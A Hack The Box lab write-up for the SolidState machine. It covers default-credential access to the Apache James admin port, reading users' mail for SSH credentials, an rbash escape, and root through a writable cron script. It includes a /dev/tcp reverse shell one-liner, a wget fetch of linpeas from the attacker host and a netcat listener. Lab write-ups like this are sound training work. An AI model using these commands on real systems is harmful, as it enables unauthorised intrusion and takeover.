---
title: HackTheBox_SolidState w/o Metasploit
date: 2024-08-03 01:22:00 -500
categories: [hackthebox,CTF,writeups]
tags: [ctf,hackthebox,writeup,linux,medium]
---

## HTB - SolidState
### Enumeration

#### nmap Scan Results

![Image](/assets/img/solidstate/image.png)

#### Dirbuster Result

##### Directories Found with a 200 Response

/  
/images/  
/assets/  
/assets/css/  
/assets/fonts/  
/assets/js/  
/assets/sass/  
/assets/css/images/  
/assets/sass/base/  
/assets/js/ie/  
/assets/sass/components/  
/assets/sass/layout/  
/assets/sass/libs/

##### Directories Found with a 403 Response

/icons/  
/icons/small/  
/server-status/

---

##### Files Found with a 200 Response
```
/index.html  
/services.html  
/about.html  
/assets/js/skel.min.js  
/assets/js/jquery.min.js  
/assets/js/jquery.scrollex.min.js  
/assets/js/util.js  
/assets/fonts/FontAwesome.otf  
/assets/css/font-awesome.min.css  
/assets/js/main.js  
/assets/css/images/close.svg  
/assets/css/ie8.css  
/assets/fonts/fontawesome-webfont.eot  
/assets/css/ie9.css  
/assets/sass/base/_page.scss  
/assets/js/ie/PIE.htc  
/assets/sass/ie8.scss  
/assets/sass/base/_typography.scss  
/assets/js/ie/backgroundsize.min.htc  
/assets/css/main.css  
/assets/sass/ie9.scss  
/assets/sass/components/_box.scss  
/assets/js/ie/html5shiv.js  
/assets/fonts/fontawesome-webfont.svg  
/assets/fonts/fontawesome-webfont.ttf  
/assets/sass/components/_button.scss  
/assets/js/ie/respond.min.js  
/assets/sass/components/_features.scss  
/assets/fonts/fontawesome-webfont.woff  
/assets/sass/components/_form.scss  
/assets/sass/main.scss  
/assets/sass/components/_icon.scss  
/assets/fonts/fontawesome-webfont.woff2  
/assets/sass/components/_image.scss  
/assets/sass/components/_list.scss  
/assets/sass/components/_section.scss  
/assets/sass/components/_table.scss  
/assets/sass/libs/_functions.scss  
/assets/sass/layout/_banner.scss  
/assets/sass/libs/_mixins.scss  
/assets/sass/layout/_footer.scss  
/assets/sass/libs/_skel.scss  
/assets/sass/libs/_vars.scss  
/assets/sass/layout/_header.scss  
/assets/sass/layout/_menu.scss  
/assets/sass/layout/_wrapper.scss
```
Nothing interesting here

### Vulnerabilities

![Image](/assets/img/solidstate/image_1.png)

### Exploitation

#### James Mail Server

James Mail Server is listening on four ports with different functions. Simple Mail Transfer Protocol (SMTP) on TCP 25, Post Office Protocol (POP3) on TCP 110, and Network News Transfer Protocol (NNTP) on TCP 119 are all services that this box is offering. I could look at potentially brute forcing valid user names or sending phishing emails, but first I want to look at port 4555.

TCP port 4555 is interesting because it is the James administration port. Even without an exploit, if I can access this service, I can likely get into things that might be useful. - 0xdf

#### Accessing Port 4555

We are able to access using default root root creds

![Image](/assets/img/solidstate/image_2.png)

![Image](/assets/img/solidstate/image_3.png)

We have these users, lets change the pass for them and then access and check out their mails

![Image](/assets/img/solidstate/image_4.png)

#### User Content

##### James

![Image](/assets/img/solidstate/image_5.png)

##### Thomas

Thomas has nothing

##### John

![Image](/assets/img/solidstate/image_6.png)

![Image](/assets/img/solidstate/image_7.png)

#### Mindy's Mail

Ok so mindy seems to have some temporary pass and her access is restricted.

Lets check mindys mail

Mindy has 2 mails

![Image](/assets/img/solidstate/image_8.png)

Lets check them out

![Image](/assets/img/solidstate/image_9.png)

![Image](/assets/img/solidstate/image_10.png)

#### Obtaining SSH Credentials

Ok so we have our ssh creds now which is mindy:P@55W0rd1!2@

Mailadmin does not have any which is ironic

![Image](/assets/img/solidstate/image_11.png)

Right off we have our user flag

![Image](/assets/img/solidstate/image_12.png)

![Image](/assets/img/solidstate/image_13.png)

#### Escaping rbash

Ok so apparently our bash is restricted to a rbash, so we have very limited commands

Lets try getting out of here first

Running cat/etc/passwd also shows us what shell mindy has access to

![Image](/assets/img/solidstate/image_14.png)

We can use the -t switch and specify bash and it would log us in with the bash shell instead of the intended rbash.

```bash
sshpass -p 'P@55W0rd1!2@' ssh [mindy@10.10.10.51](mailto:mindy@10.10.10.51) -t bash
```
But I don't think this is the intended way of getting a bash shell in this box.

Lets try using an exploit instead

![Image](/assets/img/Solidstate/image_15.png)

We will use the 4th option

#### Exploit Payload

Lets use this payload

```bash -i >& /dev/tcp/10.10.14.35/8080 0>&1```

![Image](/assets/img/solidstate/image_16.png)

![Image](/assets/img/solidstate/image_17.png)

![Image](/assets/img/solidstate/image_18.png)

Annnd we have our shell

![Image](/assets/img/solidstate/image_19.png)

#### Post-Exploitation

Lets try accessing admin with this now

![Image](/assets/img/solidstate/image_20.png)

We will still have to do some privesc, lets get linpeas on this and start enumerating for some vectors

We set up the server in the dir containing [linpeas.sh](http://linpeas.sh) with

```python3 -m http.server```

And then we use this command on the victim's machine to grab it

```wget [http://10.10.14.35:8000/linpeas.sh](http://10.10.14.35:8000/linpeas.sh)```

![Image](/assets/img/solidstate/image_21.png)

Now lets run it (run it immediately, I noticed that files put in the tmp dir are being removed periodically)

![Image](/assets/img/solidstate/image_22.png)

#### Privilege Escalation

Ok so there seems to be a cron job running under root, I’m not getting info on what is being run actually

![Image](/assets/img/solidstate/image_23.png)

Lets run a more thorough scan with linEnum

[https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

![Image](/assets/img/solidstate/image_24.png)

![Image](/assets/img/solidstate/image_25.png)

This file is pretty interesting, it has root permissions but is writable to the user

![Image](/assets/img/solidstate/image_26.png)

Lets check out the processes as well with pspy

[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

The Linux version `4.9.0-3-686-pae` indicates that this is a 32-bit kernel. The "686" refers to the 32-bit architecture, and "PAE" (Physical Address Extension) allows the system to address more than 4 GB of RAM on a 32-bit system. So, this is a 32-bit version of Debian.

So lets use the 32 bit version of pspy

![Image](/assets/img/solidstate/image_27.png)

![Image](/assets/img/solidstate/image_28.png)

Ok so this process seems to be running every 3 minutes and we know it's being run with root privs.

Lets check this file out

![Image](/assets/img/solidstate/image_29.png)

Ok so this was the file responsible for cleaning up tmp every 3 minutes, lets change it so that we get a rev shell instead.

Lets upgrade our shell a bit first

![Image](/assets/img/solidstate/image_30.png)

Now lets edit the [tmp.py](http://tmp.py) file

and in 3 minutes we should have gotten our shell

![Image](/assets/img/solidstate/image_33.png)

![Image](/assets/img/solidstate/image_31.png)

#### Final Privilege Escalation

Now that we have modified `tmp.py` to spawn a reverse shell, we need to ensure that it is executable and waits for the next cron job to trigger it.

#### Reverse Shell Payload

We set up a listener on our attacking machine to catch the reverse shell:

```nc -lvnp 4444```

Next, we need to wait for the cron job to execute the modified `tmp.py`. Once it runs, we should receive a connection from the target machine.

#### Getting Root

After receiving the connection, we will have an elevated shell with root privileges. We can then check for the root flag:

![Image](/assets/img/solidstate/image_32.png)

Finally, we obtain the root flag


